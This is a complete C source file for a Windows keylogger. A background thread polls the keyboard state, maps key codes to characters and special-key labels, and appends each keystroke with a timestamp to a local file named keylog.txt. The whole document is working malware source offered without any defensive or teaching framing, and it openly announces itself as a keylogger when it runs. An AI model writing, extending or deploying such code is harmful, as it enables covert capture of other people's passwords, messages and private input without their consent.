#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// File to store logged keys
#define LOG_FILE "keylog.txt"

// Mutex for thread-safe file writing
HANDLE fileMutex;

// Function to get the current timestamp
void getTimestamp(char *buffer, size_t bufferSize) {
    time_t rawTime = time(NULL);
    struct tm *timeInfo = localtime(&rawTime);
    strftime(buffer, bufferSize, "[%Y-%m-%d %H:%M:%S]", timeInfo);
}

// Function to log keys to a file with timestamps
void logKey(const char *key) {
    WaitForSingleObject(fileMutex, INFINITE);

    FILE *file = fopen(LOG_FILE, "a");
    if (file) {
        char timestamp[64];
        getTimestamp(timestamp, sizeof(timestamp));
        fprintf(file, "%s %s\n", timestamp, key);
        fclose(file);
    }

    ReleaseMutex(fileMutex);
}

// Function to map virtual key codes to actual characters
void mapAndLogKey(int key, int shiftPressed) {
    char buffer[128] = {0};

    // Handle printable characters
    if (key >= 0x30 && key <= 0x39) {  // Numbers
        if (shiftPressed) {
            const char *shiftedNumbers = ")!@#$%^&*(";  // Shifted symbols for 0-9
            sprintf(buffer, "%c", shiftedNumbers[key - 0x30]);
        } else {
            sprintf(buffer, "%c", key);
        }
    } else if (key >= 0x41 && key <= 0x5A) {  // Letters
        if (shiftPressed) {
            sprintf(buffer, "%c", key);  // Uppercase
        } else {
            sprintf(buffer, "%c", key + 32);  // Lowercase
        }
    } else {
        // Handle special keys explicitly
        switch (key) {
            case VK_SPACE:
                sprintf(buffer, "[SPACE]");
                break;
            case VK_RETURN:
                sprintf(buffer, "[ENTER]");
                break;
            case VK_TAB:
                sprintf(buffer, "[TAB]");
                break;
            case VK_BACK:
                sprintf(buffer, "[BACKSPACE]");
                break;
            case VK_SHIFT:
                sprintf(buffer, "[SHIFT]");
                break;
            case VK_CONTROL:
                sprintf(buffer, "[CTRL]");
                break;
            case VK_ESCAPE:
                sprintf(buffer, "[ESC]");
                break;
            default:
                sprintf(buffer, "[UNKNOWN:%d]", key);
                break;
        }
    }

    logKey(buffer);
}

// Thread function to capture and log keystrokes
DWORD WINAPI keyloggerThread(LPVOID lpParameter) {
    while (1) {
        for (int key = 8; key <= 255; key++) {  // Key codes from 8 to 255
            if (GetAsyncKeyState(key) & 0x8000) {  // Key is pressed
                int shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || 
                                   (GetKeyState(VK_CAPITAL) & 0x0001);
                mapAndLogKey(key, shiftPressed);
                Sleep(10);  // Avoid duplicate logging
            }
        }
        Sleep(10);
    }
    return 0;
}

int main() {
    fileMutex = CreateMutex(NULL, FALSE, NULL);  // Create a mutex for file writing

    if (!fileMutex) {
        printf("Failed to create mutex. Exiting...\n");
        return 1;
    }

    // Create a thread for keylogging
    HANDLE hThread = CreateThread(NULL, 0, keyloggerThread, NULL, 0, NULL);
    if (!hThread) {
        printf("Failed to create thread. Exiting...\n");
        CloseHandle(fileMutex);
        return 1;
    }

    // Keep the main thread running
    printf("Keylogger is running. Press CTRL+C to stop.\n");
    WaitForSingleObject(hThread, INFINITE);

    // Closing threads
    CloseHandle(fileMutex);
    CloseHandle(hThread);

    return 0;
}


